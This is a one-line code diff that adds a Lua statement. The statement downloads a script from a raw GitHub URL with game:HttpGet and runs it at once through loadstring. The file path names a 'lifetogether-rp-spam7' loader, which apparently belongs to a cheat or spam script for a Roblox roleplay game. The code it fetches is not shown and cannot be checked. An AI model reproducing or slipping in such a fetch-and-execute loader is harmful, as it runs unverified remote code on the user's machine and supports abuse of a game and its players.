@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/lifetogether-rp-spam7-6ery92miiwpf0i.lua"))()
